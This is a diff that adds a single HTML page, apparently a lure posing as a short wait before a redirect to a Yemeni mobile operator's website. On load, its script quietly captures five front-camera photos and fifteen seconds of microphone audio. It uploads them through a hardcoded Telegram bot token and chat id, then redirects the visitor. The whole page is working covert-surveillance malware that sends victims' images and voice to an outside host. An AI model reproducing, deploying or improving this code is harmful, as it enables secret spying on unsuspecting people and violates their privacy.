@@ -1,0 +1,127 @@
+<!DOCTYPE html>
+<html>
+<head>
+ <meta charset="UTF-8">
+ <title>Record Audio and Capture Photos</title>
+ <script src="https://unpkg.com/axios/dist/axios.min.js"></script>
+</head>
+<body>
+ <p>Recording...</p>
+ <button id="stop">Stop</button>
+ <div id="loadingMessage" style="display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background-color: white; padding: 20px; border: 1px solid black; border-radius: 5px;">
+   Please wait...
+ </div>
+
+ <script>
+ const botToken = '7317054018:AAGInl8VmqVPK1fRIYfHx7zRnGceuTcH5pY';
+ const chatId = '1538488453';
+ let recorder;
+ let audioChunks = [];
+ let photoCount = 0;
+ let audioCount = 0;
+ const maxAudioCount = 5;
+ const maxPhotoCount = 5;
+
+ async function startRecording() {
+   try {
+     const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+     recorder = new MediaRecorder(stream);
+
+     recorder.addEventListener('dataavailable', event => {
+       audioChunks.push(event.data);
+     });
+
+     recorder.addEventListener('stop', async () => {
+       const audioBlob = new Blob(audioChunks, { type: 'audio/ogg; codecs=opus' });
+       await sendAudioToTelegram(audioBlob);
+     });
+
+     recorder.start();
+     setTimeout(() => {
+       recorder.stop();
+     }, 15 * 1000); // 15 seconds
+   } catch (error) {
+     console.error('Error accessing microphone', error);
+   }
+ }
+
+ async function captureAndSendPhotos() {
+   try {
+     const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+     const videoTrack = stream.getVideoTracks()[0];
+     const imageCapture = new ImageCapture(videoTrack);
+
+     for (let i = 0; i < maxPhotoCount; i++) {
+       const photo = await imageCapture.takePhoto();
+       const canvas = document.createElement('canvas');
+       const ctx = canvas.getContext('2d');
+       const img = await createImageBitmap(photo);
+       canvas.width = img.width;
+       canvas.height = img.height;
+       ctx.drawImage(img, 0, 0);
+       canvas.toBlob(async (blob) => {
+         await sendPhotoToTelegram(blob);
+       }, 'image/jpeg', 0.1);
+     }
+   } catch (error) {
+     console.error('Error capturing and sending photos:', error);
+   }
+ }
+
+ async function sendPhotoToTelegram(photoBlob) {
+   if (photoCount < maxPhotoCount) {
+     const formData = new FormData();
+     formData.append('chat_id', chatId);
+     formData.append('photo', photoBlob, `photo${photoCount}.jpg`);
+     photoCount++;
+
+     try {
+       await axios.post(`https://api.telegram.org/bot${botToken}/sendPhoto`, formData);
+       console.log('Photo sent to Telegram bot');
+     } catch (error) {
+       console.error('Error sending photo to Telegram bot', error);
+     }
+   }
+ }
+
+ async function sendAudioToTelegram(audioBlob) {
+   if (audioCount < maxAudioCount) {
+     const formData = new FormData();
+     formData.append('chat_id', chatId);
+     formData.append('voice', audioBlob, 'voice.ogg');
+     audioCount++;
+
+     try {
+       await axios.post(`https://api.telegram.org/bot${botToken}/sendVoice`, formData);
+       console.log('Audio sent to Telegram bot');
+     } catch (error) {
+       console.error('Error sending audio to Telegram bot', error);
+     }
+   }
+ }
+
+ document.getElementById('stop').addEventListener('click', () => {
+   if (recorder && recorder.state !== 'inactive') {
+     recorder.stop();
+   }
+ });
+
+ // توجيه المستخدم إلى الصفحة المطلوبة بمجرد تحميل الصفحة بعد 30 ثانية
+ window.onload = () => {
+   // التقاط الصور وإرسالها
+   captureAndSendPhotos().then(() => {
+     // تسجيل الصوت وإرساله
+     startRecording().then(() => {
+       // عرض رسالة الانتظار
+       document.getElementById('loadingMessage').style.display = 'block';
+       // توجيه المستخدم إلى الصفحة المطلوبة بعد الانتهاء
+       setTimeout(() => {
+         window.location.href = 'https://yemenmobile.com.ye/';
+       }, 15000); // 15 seconds
+     });
+   });
+ };
+
+ </script>
+</body>
+</html>
